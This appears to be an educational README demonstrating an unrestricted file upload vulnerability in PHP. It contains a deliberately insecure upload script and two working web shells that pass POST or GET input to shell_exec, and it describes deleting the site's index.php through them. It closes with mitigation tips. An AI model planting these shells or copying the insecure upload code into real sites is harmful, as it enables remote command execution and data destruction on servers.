# Unrestricted-file-Upload

### What is unrestricted file upload vulnerability?
When an attacker could send a form data POST request with a typical filename or Multipurpose Internet Mail Extensions(MIME) and can cause Arbitrary Code Execution(ACE). 
### What did i do?
I first made the script to upload the file(which by the way is very insecure), here is the code:
```
<?php
$t_file=basename($_FILES['thefile']['name']);
if (move_uploaded_file($_FILES['thefile']['tmp_name'], $t_file)) {
	move_uploaded_file($_FILES['thefile']['tmp_name'], $t_file);
	echo "File '".$t_file."' uploaded successfully";
}else{
	echo "Something went wrong, try agains";
}
?>
```
I made 2 programs each demonstrating an aspect of file upload vulnerability, The first one, "hack.php" is a simple php script with an input, it executes as shell whatever you give as input.
here is the code
```
<?php
$shell=shell_exec('dir C:\\');
if ($_POST['exploit']) {
 $shell=shell_exec($_POST['exploit']);
   echo "<pre>$shell</pre>";
 }
 ?>
```
As you see i used shell exec which can invoke a command via shell and return the result.
Let's first unsecurely upload our file
![](img/hack2.png)<br>
![](img/hack1.png)<br>
Let's first a simple command like 'dir':
![](img/hack3.png)<br>
here is the output we get:
![](img/hack4.png)
Then let's execute a nasty command like del which will delete a file, for my case i'm going to delete the "index.php" file which is the main file.
The "index.php" file will be automatically deleted and the website will encounter problems.
This can be very scary as someone might be controlling your computer from within your website itself.
Then i made another script which takes url parameters to execute a command via shell and return the result.
Here is it's code:
```
<?php
echo shell_exec($_GET['shell'])
?>
```
This one is more scary than the first because it doesn't need visible immediate contact to execute itself, when programmers are working on a large code-base with thousands of files this one gets scary pretty fast when you see it's size"only 42 bytes".
### what can i do to make my website more secure?
-Well, use python, i mean seriously, use frameworks such as flask or django which won't just execute a file uploaded to the server but only follow predefined urls
- Scannning incoming urls
- Always use a filter "like getimagesize or pathinfo($file,PATHINFO_EXTENSION)" to check if the uploaded files are really what you want them to be 
- Limit file size, some uploads take a lot of space...(for example a script that builds an uploaded virus with gcc and so on...)
- Only allow authorized and authenticated users to use the feature. 
- Serve fetched files from your application rather than directly via the web server.
- Store files in a non-public accessibly directory if you can.
- Write to the file when you store it to include a header that makes it non-executable.

This is it, Happy coding